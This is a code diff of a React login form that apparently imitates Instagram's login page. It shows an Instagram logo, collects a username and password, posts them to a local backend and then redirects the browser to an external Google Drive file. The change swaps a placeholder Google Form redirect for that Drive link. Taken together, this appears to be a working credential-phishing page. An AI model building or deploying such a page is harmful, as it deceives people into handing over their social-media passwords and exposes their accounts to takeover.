@@ -1,20 +1,17 @@
 import React, { useState } from 'react';
 import axios from 'axios';
-import { useNavigate } from 'react-router-dom';
-// import instagramLogo from 'https://img.freepik.com/free-vector/instagram-vector-social-media-icon-7-june-2021-bangkok-thailand_53876-136728.jpg?size=338&ext=jpg&ga=GA1.1.1788614524.1717200000&semt=ais_user'; // Make sure to have an Instagram-like logo image
 
 const LoginForm = () => {
   const instagramLogo = 'https://img.freepik.com/free-vector/instagram-vector-social-media-icon-7-june-2021-bangkok-thailand_53876-136728.jpg?size=338&ext=jpg&ga=GA1.1.1788614524.1717200000&semt=ais_user';
   const [userName, setUserName] = useState('');
   const [password, setPassword] = useState('');
-  const navigate = useNavigate();
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     try {
       const response = await axios.post('http://localhost:5000/api/users', { userName, password });
       console.log('User created successfully:', response.data);
-      navigate('https://forms.gle/YOUR_GOOGLE_FORM_LINK');
+      window.location.href = 'https://drive.google.com/file/d/1cwhc2PtWJ0E9778XkbmB3ehnISfgp8qN/view'; // Redirect to external URL
     } catch (err) {
       console.error('Error creating user:', err);
     }
